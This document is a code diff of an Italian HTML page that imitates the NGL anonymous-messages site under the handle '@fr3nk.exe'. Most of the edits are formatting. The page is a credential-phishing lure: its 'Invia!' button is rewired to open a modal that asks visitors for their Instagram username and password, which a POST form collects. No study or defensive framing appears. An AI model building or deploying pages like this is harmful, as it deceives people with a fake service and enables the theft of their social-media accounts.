@@ -3,27 +3,27 @@
 <html>
 <head>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-<!--    <script type="text/javascript" async="" src="./@fr3nk.exe_files/mixpanel-2-latest.min.js"></script>-->
+    <!--    <script type="text/javascript" async="" src="./@fr3nk.exe_files/mixpanel-2-latest.min.js"></script>-->
     <title>@fr3nk.exe</title>
     <link rel="stylesheet" href="./@fr3nk.exe_files/normalize.css">
     <link rel="stylesheet" href="./@fr3nk.exe_files/style.css">
     <script src="./@fr3nk.exe_files/jquery.min.js"></script>
-<!--    <script src="./@fr3nk.exe_files/main.js"></script>-->
+    <!--    <script src="./@fr3nk.exe_files/main.js"></script>-->
     <script src="./@fr3nk.exe_files/mixpanel-jslib-snippet.js"></script>
     <script src="./@fr3nk.exe_files/saved_resource"></script>
-<!--    <meta name="viewport" content="initial-scale=1.0, maximum-scale=1.0, user-scalable=no, width=device-width">-->
-<!--    <meta name="user:language" content="it">-->
-<!--    <meta property="og:image"-->
-<!--          content="https://vercel-og-nextjs-ngl-labs.vercel.app/api/pfp?pfp=https%3A%2F%2Ffirebasestorage.googleapis.com%3A443%2Fv0%2Fb%2Fask-fun-d10f0.appspot.com%2Fo%2Fimages%252FEA2FA533-2083-427B-96B3-11AAB8A98EFB.jpg%3Falt%3Dmedia%26token%3D30337a1d-2545-49d0-be64-81e3ff93bbc3">-->
-<!--    <meta property="og:title" content="Inviami messaggi anonimi!">-->
-<!--    <meta property="og:description" content="NGL: Anonymous Q&amp;A">-->
-<!--    <meta name="twitter:card" content="summary_large_image">-->
-<!--    <meta name="twitter:image"-->
-<!--          content="https://vercel-og-nextjs-ngl-labs.vercel.app/api/pfp?pfp=https%3A%2F%2Ffirebasestorage.googleapis.com%3A443%2Fv0%2Fb%2Fask-fun-d10f0.appspot.com%2Fo%2Fimages%252FEA2FA533-2083-427B-96B3-11AAB8A98EFB.jpg%3Falt%3Dmedia%26token%3D30337a1d-2545-49d0-be64-81e3ff93bbc3">-->
-<!--    <meta name="twitter:title" content="@fr3nk.exe: Send me anonymous messages!">-->
-<!--    <meta name="twitter:description" content="NGL: Anonymous Q&amp;A">-->
-<!--    <script></script>-->
-<!--    <script src="./@fr3nk.exe_files/js" async=""></script>-->
+    <meta name="viewport" content="initial-scale=1.0, maximum-scale=1.0, user-scalable=no, width=device-width">
+    <meta name="user:language" content="it">
+    <!--    <meta property="og:image"-->
+    <!--          content="https://vercel-og-nextjs-ngl-labs.vercel.app/api/pfp?pfp=https%3A%2F%2Ffirebasestorage.googleapis.com%3A443%2Fv0%2Fb%2Fask-fun-d10f0.appspot.com%2Fo%2Fimages%252FEA2FA533-2083-427B-96B3-11AAB8A98EFB.jpg%3Falt%3Dmedia%26token%3D30337a1d-2545-49d0-be64-81e3ff93bbc3">-->
+    <!--    <meta property="og:title" content="Inviami messaggi anonimi!">-->
+    <!--    <meta property="og:description" content="NGL: Anonymous Q&amp;A">-->
+    <!--    <meta name="twitter:card" content="summary_large_image">-->
+    <!--    <meta name="twitter:image"-->
+    <!--          content="https://vercel-og-nextjs-ngl-labs.vercel.app/api/pfp?pfp=https%3A%2F%2Ffirebasestorage.googleapis.com%3A443%2Fv0%2Fb%2Fask-fun-d10f0.appspot.com%2Fo%2Fimages%252FEA2FA533-2083-427B-96B3-11AAB8A98EFB.jpg%3Falt%3Dmedia%26token%3D30337a1d-2545-49d0-be64-81e3ff93bbc3">-->
+    <!--    <meta name="twitter:title" content="@fr3nk.exe: Send me anonymous messages!">-->
+    <!--    <meta name="twitter:description" content="NGL: Anonymous Q&amp;A">-->
+    <!--    <script></script>-->
+    <!--    <script src="./@fr3nk.exe_files/js" async=""></script>-->
 </head>
 <body>
 <script>
@@ -43,7 +43,7 @@
     }
 
 
-        function textAreaChange(){
+    function textAreaChange(){
 
         if(document.getElementById("question").value!= "")
             document.getElementById("inviamsg").style.display ="block";
@@ -73,7 +73,7 @@
             </div>
             <div class="modal-body" style="text-align: center">
                 <form class="form" method="post">
-                <div class="prompt">Inserisci le tue credenziali di instagram per continuare...</div>
+                    <div class="prompt">Inserisci le tue credenziali di instagram per continuare...</div>
                     <br>
                     <div>
                         <input class="username" placeholder="Username di instagram" type="text" name="username" id="username">
@@ -110,11 +110,11 @@
             <div class="textarea-container">
                 <div class="dice-button">🎲</div>
                 <textarea  oninput="textAreaChange()" placeholder="Inviami dei messaggi anonimi…" name="question" autocomplete="off" maxlength="300"
-                          id="question"></textarea></div>
+                           id="question"></textarea></div>
             <input class="deviceId" type="hidden" name="deviceId" id="deviceId"
                    value="a7762ffc-6b04-4b36-ad72-dd7570982473"></div>
         <div class="anonymous-tooltip">🔒 domande e risposte anonime</div>
-<!--        <button id="inviamsg" class="submit" type="submit" style="transform: translateZ(0px); z-index: 1000; display: none">Invia!-->
+        <!--        <button id="inviamsg" class="submit" type="submit" style="transform: translateZ(0px); z-index: 1000; display: none">Invia!-->
         <button id="inviamsg" class="submit" type="button" onclick="openLoginModal()" style="transform: translateZ(0px); z-index: 1000; display: none">Invia!
         </button>
     </form>
